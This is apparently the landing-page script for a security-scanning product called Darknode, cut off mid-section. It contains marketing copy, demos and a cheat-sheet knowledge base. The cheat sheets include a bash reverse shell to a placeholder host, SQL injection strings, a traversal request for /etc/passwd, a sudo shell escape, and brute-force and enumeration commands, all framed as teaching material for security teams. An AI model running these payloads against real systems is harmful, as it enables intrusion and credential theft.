// Copyright (c) 2026 Darknode-Official. All rights reserved.
// Source-available for learning only. Redistribution prohibited. See LICENSE.
(function(){var _h=location.hostname,_a=["darknode.ai","www.darknode.ai","sentinel-b4194.web.app","sentinel-b4194-6173e.web.app","localhost","127.0.0.1"];if(!_a.some(function(d){return _h===d})&&!/^darknode-web-[a-z0-9]+\.onrender\.com$/.test(_h)&&!/^sentinel-b4194(-6173e)?--[a-z0-9-]+\.web\.app$/.test(_h))throw document.body.innerHTML="",new Error("unlicensed")}());

import { db } from "/js/firebase.js?v=20261021a";
import { collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.17.0/firebase-firestore.js";

const GITHUB = "https://github.com/Darknode-Official";

// Desktop app downloads. The exact asset name carries a version, so instead of
// hardcoding a URL that rots on every release we resolve the right installer for
// the visitor's OS at click time from the latest GitHub release (same source the
// in-console download page uses). Falls back to the releases page if that fails.
// Flip to true once darknode-app publishes a release with installers
// (.AppImage / .dmg / Setup.exe). Until then the desktop-app card shows the
// platform tag instead of a download button, so we never link to an empty page.
const APP_DL_LIVE = false;
const APP_REPO = "Darknode-Official/darknode-app";
const APP_RELEASES = "https://github.com/" + APP_REPO + "/releases/latest";
const APP_OS_LABEL = { linux: "Linux", mac: "macOS", windows: "Windows" };
// First matching asset wins per OS (AppImage preferred over .deb on Linux).
const APP_OS_MATCH = {
  windows: [/setup.*\.exe$/i, /\.exe$/i],
  mac: [/\.dmg$/i],
  linux: [/\.appimage$/i, /_amd64\.deb$/i],
};
function appDetectOS() {
  const s = (navigator.userAgent + " " + (navigator.platform || "")).toLowerCase();
  if (s.includes("win")) return "windows";
  if (s.includes("mac") || s.includes("iphone") || s.includes("ipad")) return "mac";
  return "linux";
}
async function appResolveAsset(os) {
  try {
    const r = await fetch("https://api.github.com/repos/" + APP_REPO + "/releases/latest");
    if (r.ok) {
      const rel = await r.json();
      const assets = rel.assets || [];
      for (const re of (APP_OS_MATCH[os] || [])) {
        const a = assets.find((x) => re.test(x.name || ""));
        if (a && a.browser_download_url) return a.browser_download_url;
      }
    }
  } catch (_) {}
  return null;
}

export function renderLanding(view, actions) {
  view.innerHTML = `

    <!-- ====== HERO ====== -->
    <section class="hero" aria-label="Hero">
      <div class="hero-mesh"></div>
      <div class="hero-grain"></div>
      <div class="wrap hero-inner">
        <div class="hero-badge"><span class="badge-dot"></span> Runs air-gapped &middot; Deterministic &middot; Your data stays yours</div>
        <h1 class="hero-h1">Find the real risks in your<br><span class="hero-rotate-wrap"><span class="hero-rotate" id="hero-rotate">code</span></span></h1>
        <p class="hero-sub">Darknode scans your code, cloud, dependencies, configs and records for real vulnerabilities and risks — with accurate, explainable, deterministic engines that run on your own infrastructure. No black-box AI deciding severity, no data leaving your estate.</p>
        <div class="hero-cta">
          <button class="btn lg" id="cta-start">Scan your first repo &mdash; free</button>
          <a class="btn lg ghost" href="${GITHUB}/darknode-cli" target="_blank" rel="noopener">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" style="margin-right:8px"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.3 3.44 9.8 8.2 11.39.6.11.82-.26.82-.58v-2.23c-3.34.73-4.04-1.42-4.04-1.42-.55-1.39-1.34-1.76-1.34-1.76-1.08-.74.08-.73.08-.73 1.2.08 1.84 1.23 1.84 1.23 1.07 1.83 2.81 1.3 3.5 1 .1-.78.42-1.3.76-1.6-2.67-.3-5.47-1.33-5.47-5.93 0-1.31.47-2.38 1.24-3.22-.14-.3-.54-1.52.1-3.18 0 0 1-.32 3.3 1.23a11.5 11.5 0 016.02 0c2.28-1.55 3.29-1.23 3.29-1.23.64 1.66.24 2.88.12 3.18.77.84 1.23 1.91 1.23 3.22 0 4.61-2.8 5.63-5.48 5.92.42.37.81 1.1.81 2.22v3.29c0 .32.22.7.82.58A12.01 12.01 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
            Star on GitHub
          </a>
        </div>
        <div class="hero-built-with">
          <span class="built-label">Built with</span>
          <div class="built-pills">
            <span class="built-pill">Node.js</span>
            <span class="built-pill">Python</span>
            <span class="built-pill">Ollama</span>
            <span class="built-pill">Claude</span>
            <span class="built-pill">Firebase</span>
            <span class="built-pill">Linux</span>
          </div>
        </div>
      </div>
    </section>

    <!-- ====== PRODUCT BENTO ====== -->
    <section class="section" id="products" aria-labelledby="products-title">
      <div class="wrap">
        <div class="sec-label">Products</div>
        <h2 class="sec-title" id="products-title">One platform. Every surface.</h2>
        <p class="sec-sub">Web, desktop, terminal, cloud, and a programmable API — deploy it wherever your security and engineering teams already work.</p>
        <div class="bento">
          <div class="bento-card">
            <div class="bento-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="3"/><path d="M7 8h10M7 12h6M7 16h8"/></svg>
            </div>
            <h3>Web App</h3>
            <p>Open darknode.ai in your browser. Scan code and cloud, triage CVEs, map compliance, and run investigations from one command center — zero install.</p>
            <span class="bento-tag">No install needed</span>
          </div>
          <div class="bento-card">
            <div class="bento-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
            </div>
            <h3>CLI</h3>
            <!-- NPM_SUSPENDED: restore <code>npm i -g darknode-cli</code> and the "npm install" tag when the npm account is back -->
            <p>Clone and run: <code>git clone .../darknode-cli</code>. Run the full scanning and analysis toolset in CI/CD, fail builds on real findings, and ship results as artifacts.</p>
            <span class="bento-tag">git clone</span>
          </div>
          <div class="bento-card">
            <div class="bento-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="3" y="4" width="18" height="14" rx="2"/><path d="M8 21h8M12 18v3"/><path d="M7 9l2.5 2L7 13M13 13h4"/></svg>
            </div>
            <h3>Desktop App</h3>
            <p>Native app for macOS, Windows, and Linux. The full workspace, offline-first, with system-level scanning for teams that keep sensitive code off the cloud.</p>
            ${APP_DL_LIVE ? `<div class="bento-dl">
              <a class="btn sm" id="app-dl" href="${APP_RELEASES}" target="_blank" rel="noopener">Download the app</a>
              <a class="bento-dl-alt" id="app-dl-alt" href="${APP_RELEASES}" target="_blank" rel="noopener">Other platforms</a>
            </div>` : `<span class="bento-tag">macOS &middot; Win &middot; Linux</span>`}
          </div>
          <div class="bento-card">
            <div class="bento-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="3"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3M5 5l2 2M17 17l2 2M19 5l-2 2M7 17l-2 2"/></svg>
            </div>
            <h3>REST API</h3>
            <p>Every scanning and analysis engine behind a clean HTTP API. Run the server with the CLI, set a token, and wire Darknode into your pipelines and dashboards &mdash; on your own infrastructure.</p>
            <span class="bento-tag">runs locally &middot; token auth</span>
          </div>
          <div class="bento-card">
            <div class="bento-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M4 7l8-4 8 4v10l-8 4-8-4z"/><path d="M4 7l8 4 8-4M12 11v10"/></svg>
            </div>
            <h3>MCP Server</h3>
            <p>Plug Darknode into Claude, Cursor, Codex and any MCP client. Your team's assistants get the Deck's 32 analysis tools as callable functions, run on your own machine, with the tools your plan includes.</p>
            <span class="bento-tag">Model Context Protocol</span>
          </div>
          <div class="bento-card">
            <div class="bento-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M2 8h20"/><circle cx="5" cy="6" r=".5" fill="currentColor"/><circle cx="7.5" cy="6" r=".5" fill="currentColor"/></svg>
            </div>
            <h3>Cloud VM</h3>
            <p>A full security workstation with every Darknode engine built in. Runs in VirtualBox, QEMU, or your own cloud — including air-gapped.</p>
            <span class="bento-tag">VirtualBox &middot; cloud</span>
          </div>
        </div>
      </div>
    </section>

    <!-- ====== INTEGRATIONS STRIP ====== -->
    <section class="section integ-band" aria-label="Integrations">
      <div class="wrap">
        <p class="integ-label">Plugs into the tools you already use</p>
        <div class="integ-row">
          <span class="integ-pill">Claude</span>
          <span class="integ-pill">Cursor</span>
          <span class="integ-pill">VS Code</span>
          <span class="integ-pill">GitHub</span>
          <span class="integ-pill">Docker</span>
          <span class="integ-pill">Kali Linux</span>
          <span class="integ-pill">Burp Suite</span>
          <span class="integ-pill">Nmap</span>
          <span class="integ-pill">Metasploit</span>
          <span class="integ-pill">Ollama</span>
          <span class="integ-pill">Wireshark</span>
          <span class="integ-pill">MCP</span>
        </div>
      </div>
    </section>

    <!-- ====== FEATURES ====== -->
    <section class="section alt" id="features" aria-labelledby="features-title">
      <div class="wrap">
        <div class="sec-label">Capabilities</div>
        <h2 class="sec-title" id="features-title">Everything your security team needs in one place</h2>
        <div class="feature-rows">
          <div class="feature-row">
            <div class="feature-text">
              <h3>Scan code, cloud and dependencies</h3>
              <p>Static analysis, dependency and SBOM checks, secret detection and cloud-config review run in the Deck, ready to use. The CLI adds checks from your own terminal: port scans of hosts you are allowed to test, plus dependency and environment-variable audits.</p>
            </div>
            <div class="feature-visual">
              <div class="term-window">
                <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">darknode (example)</span></div>
                <pre class="tw-body"><span class="c-pl">$</span> darknode scan 192.0.2.10 top
<span class="c-mut">PORT   SERVICE   BANNER</span>
<span class="c-ok">22</span>     ssh       SSH-2.0-OpenSSH_9.6
<span class="c-ok">443</span>    https
<span class="c-acc">&#9679;</span> 2 open ports on 192.0.2.10</pre>
              </div>
            </div>
          </div>
          <div class="feature-row reverse">
            <div class="feature-text">
              <h3>Deterministic engines, with AI only to explain</h3>
              <p>The engines that find and rank risk are deterministic — no model decides severity. Nexus, the optional assistant, only reads the findings to explain them and draft remediation. Run it on a local model and nothing leaves your machine, or use your own key.</p>
            </div>
            <div class="feature-visual">
              <div class="term-window">
                <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">nexus</span></div>
                <pre class="tw-body"><span class="c-pl">$</span> nexus "explain CVE-2021-44228"\n\n<span class="c-acc">Nexus:</span> Log4Shell is a critical RCE\nin Apache Log4j. It exploits\nJNDI lookup string injection...\n\n<span class="c-mut">engine: ollama (local, free)</span></pre>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- ====== HOW IT WORKS (4-step timeline) ====== -->
    <section class="section" id="how" aria-labelledby="how-title">
      <div class="wrap">
        <div class="sec-label">How it works</div>
        <h2 class="sec-title" id="how-title">From repo to findings in four steps</h2>
        <p class="sec-sub">From install to your first scan of real code in under five minutes.</p>
        <div class="timeline-v">

          <div class="tlv-step">
            <div class="tlv-num">1</div>
            <div class="tlv-body">
              <div class="tlv-text">
                <h3>Install from source</h3>
                <!-- NPM_SUSPENDED: restore "Install in one command" + <code>npm i -g darknode-cli</code> when the npm account is back -->
                <p><code>git clone</code> the CLI repo or download the desktop app. Works on Linux, macOS, and Windows.</p>
              </div>
              <div class="tlv-visual">
                <div class="term-window demo-term">
                  <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">terminal</span></div>
                  <!-- NPM_SUSPENDED: restore the "npm i -g darknode-cli" terminal demo when the npm account is back -->
                  <pre class="tw-body"><span class="c-pl">$</span> git clone https://github.com/Darknode-Official/darknode-cli\n<span class="c-mut">Cloning into 'darknode-cli'...</span>\n<span class="c-mut">done.</span>\n\n<span class="c-pl">$</span> node darknode.js --version\n<span class="c-ok">darknode v2.46.3</span></pre>
                </div>
              </div>
            </div>
          </div>

          <div class="tlv-step">
            <div class="tlv-num">2</div>
            <div class="tlv-body">
              <div class="tlv-text">
                <h3>Point it at your code or cloud</h3>
                <p>Connect a repository, cloud account, or dependency manifest. Everything runs on your infrastructure — nothing leaves your estate without your say-so.</p>
              </div>
              <div class="tlv-visual">
                <div class="term-window demo-term">
                  <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">nexus</span></div>
                  <pre class="tw-body"><span class="c-pl">$</span> nexus\n\n  <span class="c-acc">Nexus v2.14</span>\n  Model: <span class="c-ok">local</span> (no key) or <span class="c-ok">BYOK cloud</span>\n  Status: <span class="c-ok">Ready</span>\n\n<span class="c-acc">nexus&gt;</span> <span class="tw-cursor">_</span></pre>
                </div>
              </div>
            </div>
          </div>

          <div class="tlv-step">
            <div class="tlv-num">3</div>
            <div class="tlv-body">
              <div class="tlv-text">
                <h3>Run the scan</h3>
                <p>Deterministic engines find vulnerabilities, risky dependencies, exposed secrets, and misconfigurations — each with the exact file and line, ranked by real severity.</p>
              </div>
              <div class="tlv-visual">
                <div class="term-window demo-term">
                  <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">nexus</span></div>
                  <pre class="tw-body"><span class="c-acc">nexus&gt;</span> scan 10.10.14.7 and explain\n        what you find\n\n<span class="c-acc">Nexus:</span> Running nmap on target...\n\n<span class="c-ok">22</span>  ssh    OpenSSH 9.6\n<span class="c-ok">80</span>  http   nginx 1.24\n<span class="c-ok">443</span> https\n\nPort 22: check <span class="c-bad">CVE-2024-6387</span>...</pre>
                </div>
              </div>
            </div>
          </div>

          <div class="tlv-step">
            <div class="tlv-num">4</div>
            <div class="tlv-body">
              <div class="tlv-text">
                <h3>Fix, track, and report</h3>
                <p>Jump straight to the vulnerable line, apply the suggested fix, gate your CI on findings, and export audit-ready reports. Everything runs on your machine.</p>
              </div>
              <div class="tlv-visual">
                <div class="term-window demo-term">
                  <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">darknode</span></div>
                  <pre class="tw-body"><span class="c-pl">$</span> darknode lab start dvwa\n<span class="c-ok">[+]</span> DVWA running on localhost:8080\n\n<span class="c-acc">nexus&gt;</span> walk me through SQL injection\n\n<span class="c-acc">Nexus:</span> Open localhost:8080/login.\nTry entering <span class="c-bad">' OR 1=1--</span> in the\nusername field...</pre>
                </div>
              </div>
            </div>
          </div>

        </div>
      </div>
    </section>

    <!-- ====== NEXUS ENGINE ====== -->
    <section class="section nx-section" id="nexus" aria-labelledby="nexus-title">
      <div class="nx-section-glow"></div>
      <div class="wrap">
        <div class="sec-label">AI Assistant</div>
        <h2 class="sec-title" id="nexus-title">Nexus &mdash; the assistant on top of your findings</h2>
        <p class="sec-sub">The deterministic engines do the finding and ranking; Nexus turns those results into plain-English explanations, remediation steps, and draft reports. It runs on your choice of backend &mdash; Claude, GPT, Gemini, Groq, Mistral and OpenRouter in the cloud, or a fully local model via Ollama for teams that keep everything in-house.</p>

        <!-- Architecture diagram -->
        <div class="nx-arch" aria-label="Nexus architecture diagram">
          <div class="nx-arch-layer nx-arch-l1">
            <div class="nx-arch-header">
              <span class="nx-arch-label">6 AI Engines</span>
              <span class="nx-arch-tag">Layer 1</span>
            </div>
            <div class="nx-arch-pills">
              <span class="nx-arch-pill">Claude</span>
              <span class="nx-arch-pill">Gemini</span>
              <span class="nx-arch-pill">Codex</span>
              <span class="nx-arch-pill">OpenCode</span>
              <span class="nx-arch-pill">Aider</span>
              <span class="nx-arch-pill">Ollama</span>
            </div>
          </div>
          <div class="nx-arch-connector"></div>
          <div class="nx-arch-layer nx-arch-l2">
            <div class="nx-arch-header">
              <span class="nx-arch-label">Planning &amp; Orchestration</span>
              <span class="nx-arch-tag">Layer 2</span>
            </div>
            <div class="nx-arch-pills">
              <span class="nx-arch-pill">Planner</span>
              <span class="nx-arch-pill">Agents</span>
              <span class="nx-arch-pill">Pipelines</span>
              <span class="nx-arch-pill">Batch</span>
              <span class="nx-arch-pill">Background Jobs</span>
              <span class="nx-arch-pill">Race &amp; Ensemble</span>
              <span class="nx-arch-pill">Cowork</span>
            </div>
          </div>
          <div class="nx-arch-connector"></div>
          <div class="nx-arch-layer nx-arch-l3">
            <div class="nx-arch-header">
              <span class="nx-arch-label">Memory &amp; Context</span>
              <span class="nx-arch-tag">Layer 3</span>
            </div>
            <div class="nx-arch-pills">
              <span class="nx-arch-pill">Memory</span>
              <span class="nx-arch-pill">Sessions</span>
              <span class="nx-arch-pill">Repo Map</span>
              <span class="nx-arch-pill">Code Intel</span>
              <span class="nx-arch-pill">File State</span>
              <span class="nx-arch-pill">Rewind &amp; Undo</span>
            </div>
          </div>
          <div class="nx-arch-connector"></div>
          <div class="nx-arch-layer nx-arch-l4">
            <div class="nx-arch-header">
              <span class="nx-arch-label">Verification</span>
              <span class="nx-arch-tag">Layer 4</span>
            </div>
            <div class="nx-arch-pills">
              <span class="nx-arch-pill">Verify</span>
              <span class="nx-arch-pill">Code Review</span>
              <span class="nx-arch-pill">Code Radar</span>
              <span class="nx-arch-pill">Smart Tests</span>
              <span class="nx-arch-pill">Invariants</span>
              <span class="nx-arch-pill">Bisect</span>
              <span class="nx-arch-pill">Diagnose</span>
              <span class="nx-arch-pill">Loop Guard</span>
            </div>
          </div>
          <div class="nx-arch-connector"></div>
          <div class="nx-arch-layer nx-arch-l5">
            <div class="nx-arch-footer-band">Ships in the Darknode CLI &mdash; runs in your own terminal with your own engine credentials</div>
          </div>
        </div>

        <!-- Feature highlights -->
        <div class="nx-highlights">
          <div class="nx-hl">
            <div class="nx-hl-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v3m0 12v3M3 12h3m12 0h3m-3.5-6.5L16 7m-8 10l-2.5 2.5M20.5 18.5L18 16M5.5 7L3.5 5.5"/><circle cx="12" cy="12" r="4"/></svg>
            </div>
            <h3>Multi-engine</h3>
            <p>Switch between 6 AI engines, race them against each other, or ensemble their answers for higher accuracy.</p>
          </div>
          <div class="nx-hl">
            <div class="nx-hl-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 3H5a2 2 0 00-2 2v4m6-6h10a2 2 0 012 2v4M9 3v18m0 0H5a2 2 0 01-2-2v-4m6 6h10a2 2 0 002-2v-4"/><path d="M14 9l-1 2 3 2-1 2"/></svg>
            </div>
            <h3>Autonomous</h3>
            <p>Give it a goal -- it plans, executes, and verifies with zero babysitting. Background jobs keep long tasks running while you work.</p>
          </div>
          <div class="nx-hl">
            <div class="nx-hl-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/><circle cx="12" cy="16" r="1"/></svg>
            </div>
            <h3>Private</h3>
            <p>Runs 100% locally with Ollama. Your code never leaves your machine. No telemetry, no cloud, no data collection.</p>
          </div>
        </div>

        <!-- Collapsible module list -->
        <details class="nx-details">
          <summary>See the main modules &darr;</summary>
          <div class="nx-modules">
            <div class="nx-group">
              <h3>Intelligence</h3>
              <span>Code Intel</span><span>Repo Map</span><span>Read Symbol</span><span>Code Radar</span><span>Threat Model</span><span>Security KB</span><span>Threat Intel</span>
            </div>
            <div class="nx-group">
              <h3>Execution</h3>
              <span>Planner</span><span>Agents</span><span>Pipelines</span><span>Batch</span><span>Background Jobs</span><span>Shell Run</span><span>Web Search</span><span>Browser</span>
            </div>
            <div class="nx-group">
              <h3>Memory</h3>
              <span>Memory</span><span>Sessions</span><span>File State</span><span>Rewind &amp; Undo</span><span>Todos</span>
            </div>
            <div class="nx-group">
              <h3>Quality</h3>
              <span>Verify</span><span>Code Review</span><span>Smart Tests</span><span>Invariants</span><span>Attest</span><span>Bisect</span><span>Explain Break</span><span>Diagnose</span><span>Loop Guard</span>
            </div>
            <div class="nx-group">
              <h3>Security</h3>
              <span>Vuln Scanner</span><span>Pentest Engine</span><span>Attack Planner</span><span>Finding Validation</span><span>Git Security</span><span>Env Audit</span><span>Incident Response</span><span>Report Generator</span>
            </div>
            <div class="nx-group">
              <h3>Infrastructure</h3>
              <span>MCP Bridge</span><span>Ask Bridge</span><span>Guardrails</span><span>Redaction</span><span>Jail</span><span>Dashboard</span><span>6 AI Engines</span>
            </div>
          </div>
        </details>
      </div>
    </section>

    <!-- ====== SECURITY KNOWLEDGE ====== -->
    <section class="section" id="security-knowledge" aria-labelledby="rag-title">
      <div class="wrap">
        <div class="sec-label">Knowledge base</div>
        <h2 class="sec-title" id="rag-title">Every finding comes with the context to fix it</h2>
        <p class="sec-sub">A deep, structured knowledge base covering OWASP standards, real-world attack patterns, and remediation guidance — so your engineers understand each finding and know exactly how to close it.</p>
        <div class="rag-tabs" role="tablist" aria-label="Knowledge categories">
          <button class="rag-tab active" role="tab" aria-selected="true" data-rag="owasp">OWASP Top 10</button>
          <button class="rag-tab" role="tab" aria-selected="false" data-rag="attacks">Security Patterns</button>
          <button class="rag-tab" role="tab" aria-selected="false" data-rag="tools">Cheat Sheets</button>
          <button class="rag-tab" role="tab" aria-selected="false" data-rag="privesc">Privilege Escalation</button>
          <button class="rag-tab" role="tab" aria-selected="false" data-rag="recon">Network Recon</button>
        </div>

        <div class="rag-panel active" data-rag-panel="owasp">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Broken Access Control</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>Insecure direct object references (IDOR), missing function-level authorization checks, and path traversal. Unauthorized users may modify identifiers to access other users' data.</p>
              <div class="rag-code"><code>GET /api/user/124  -->  GET /api/user/125</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Injection</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>SQL injection, command injection, and cross-site scripting. Unsanitized user input is interpreted as code by the backend or database engine.</p>
              <div class="rag-code"><code>' OR 1=1 --</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Security Misconfiguration</h3>
                <span class="sev high">High</span>
              </div>
              <p>Default credentials left in production, debug mode enabled, missing security headers, unnecessary services exposed. The most common class of real-world findings.</p>
              <div class="rag-code"><code>X-Powered-By: Express\nServer: Apache/2.4.49</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Cryptographic Failures</h3>
                <span class="sev high">High</span>
              </div>
              <p>Weak or missing encryption for data in transit and at rest. Deprecated algorithms, hardcoded secrets, and exposed sensitive data in logs or error messages.</p>
              <div class="rag-code"><code>Set-Cookie: session=abc123  (missing Secure; HttpOnly)</code></div>
            </div>
          </div>
        </div>

        <div class="rag-panel" data-rag-panel="attacks">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Authentication Bypass</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>SQL injection in login forms, default credentials, JWT manipulation, and comment-based truncation. Bypasses authentication entirely without valid credentials.</p>
              <div class="rag-code"><code>admin' --\n' OR 1=1 --\n' UNION SELECT null,null --</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Remote Access</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>Technique establishing an outbound connection from a target system back to a testing listener, granting interactive shell access for assessment.</p>
              <div class="rag-code"><code>bash -i >& /dev/tcp/TESTER/4444 0>&1</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Directory Traversal</h3>
                <span class="sev high">High</span>
              </div>
              <p>Path manipulation to escape the web root and read arbitrary files on the server. Targets configuration files, credentials, and system internals.</p>
              <div class="rag-code"><code>GET /download?file=../../../etc/passwd</code></div>
            </div>
          </div>
        </div>

        <div class="rag-panel" data-rag-panel="tools">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Nmap Service Scan</h3>
                <span class="sev medium">Medium</span>
              </div>
              <p>Network mapper with version detection. Identifies open ports, running services, and OS fingerprints. The first step in any engagement's reconnaissance phase.</p>
              <div class="rag-code"><code>nmap -sV -sC -O -p- 10.10.14.7</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>SQLMap Automated Injection</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>Automated SQL injection testing and database assessment. Detects injection points, enumerates databases, reads files, and tests access controls on target applications.</p>
              <div class="rag-code"><code>sqlmap -u "http://target/page?id=1" --dbs --batch</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Gobuster Directory Discovery</h3>
                <span class="sev medium">Medium</span>
              </div>
              <p>High-speed directory and file enumeration using wordlists. Discovers hidden admin panels, backup files, API endpoints, and configuration files.</p>
              <div class="rag-code"><code>gobuster dir -u http://target -w /usr/share/wordlists/common.txt</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Hydra Credential Testing</h3>
                <span class="sev high">High</span>
              </div>
              <p>Online credential tester supporting 50+ protocols. Tests credential pairs against SSH, FTP, HTTP forms, databases, and other network services.</p>
              <div class="rag-code"><code>hydra -l admin -P rockyou.txt ssh://10.10.14.7</code></div>
            </div>
          </div>
        </div>

        <div class="rag-panel" data-rag-panel="privesc">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>SUID Binary Analysis</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>Finding binaries with the SUID bit set that could allow privilege escalation from a low-privilege user to root. Common findings include custom scripts and misconfigured system utilities.</p>
              <div class="rag-code"><code>find / -perm -4000 -type f 2>/dev/null</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Sudo Misconfigurations</h3>
                <span class="sev critical">Critical</span>
              </div>
              <p>Identifying overly permissive sudo rules. Users allowed to run specific binaries as root without password may be able to escalate privileges through those binaries.</p>
              <div class="rag-code"><code>sudo -l\nsudo vim -c ':!/bin/bash'</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Cron Job Hijacking</h3>
                <span class="sev high">High</span>
              </div>
              <p>Identifying writable scripts executed by root cron jobs. Replacing or appending to these scripts grants code execution as root on the next scheduled run.</p>
              <div class="rag-code"><code>cat /etc/crontab\nls -la /var/spool/cron/</code></div>
            </div>
          </div>
        </div>

        <div class="rag-panel" data-rag-panel="recon">
          <div class="rag-grid">
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Subdomain Enumeration</h3>
                <span class="sev medium">Medium</span>
              </div>
              <p>Discovering hidden subdomains through DNS brute-forcing, certificate transparency logs, and passive OSINT sources. Expands the scope of assessment significantly.</p>
              <div class="rag-code"><code>subfinder -d target.com -silent | httpx -title -status-code</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>DNS Zone Transfer</h3>
                <span class="sev high">High</span>
              </div>
              <p>Attempting AXFR requests against misconfigured DNS servers. A successful transfer reveals every record in the zone -- hosts, mail servers, internal infrastructure.</p>
              <div class="rag-code"><code>dig axfr @ns1.target.com target.com</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>SMB Enumeration</h3>
                <span class="sev high">High</span>
              </div>
              <p>Enumerating Windows shares, users, and groups through the SMB protocol. Discovers open shares, null sessions, and credentials stored in accessible file shares.</p>
              <div class="rag-code"><code>enum4linux -a 10.10.14.7\nsmbclient -L //10.10.14.7 -N</code></div>
            </div>
            <div class="rag-card">
              <div class="rag-card-head">
                <h3>Web Technology Fingerprinting</h3>
                <span class="sev medium">Medium</span>
              </div>
              <p>Identifying frameworks, CMS platforms, server software, and client-side libraries. Guides assessment planning by revealing the exact technology stack in use.</p>
              <div class="rag-code"><code>whatweb http://target.com -v\nwappalyzer http://target.com</code></div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- ====== DARKNODE OS ====== -->
    <section class="section alt" id="darknode-os" aria-labelledby="os-title">
      <div class="wrap">
        <div class="sec-label">Darknode OS</div>
        <h2 class="sec-title" id="os-title">Your own security operating system</h2>
        <p class="sec-sub">Two editions — a custom x86 kernel built from scratch, and a full Linux desktop. Both run on your own machines, ideal for locked-down and air-gapped environments.</p>
        <div class="os-grid">
          <div class="os-card">
            <div class="os-card-icon"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></div>
            <h3 class="os-card-title">Darknode OS — Custom Kernel</h3>
            <p class="os-card-desc">Built from scratch &mdash; no Linux, no borrowed code. A from-scratch x86 research kernel with its own shell and filesystem that boots under QEMU. An ongoing systems-programming project, not a daily driver.</p>
            <ul class="os-features">
              <li>Multiboot2 boot &rarr; GRUB bootloader</li>
              <li>VGA console, PS/2 keyboard, PIT timer</li>
              <li>Physical memory manager + heap allocator</li>
              <li>VFS, ramfs, devfs filesystems</li>
              <li>Round-robin process scheduler</li>
              <li>ATA disk + NE2000 NIC drivers</li>
              <li>Ethernet, ARP, IPv4, ICMP, UDP, DHCP, DNS</li>
              <li>28-command built-in shell</li>
            </ul>
            <div class="os-card-meta">12 MB &middot; Boots in VirtualBox &amp; QEMU</div>
            <a href="https://github.com/Darknode-Official/darknode-os/releases/download/v0.1.0/darknode-os.iso" class="btn lg os-dl" target="_blank" rel="noopener">Download ISO</a>
          </div>
          <div class="os-card">
            <div class="os-card-icon"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" y1="22" x2="4" y2="15"/></svg></div>
            <h3 class="os-card-title">Darknode OS — Linux Edition</h3>
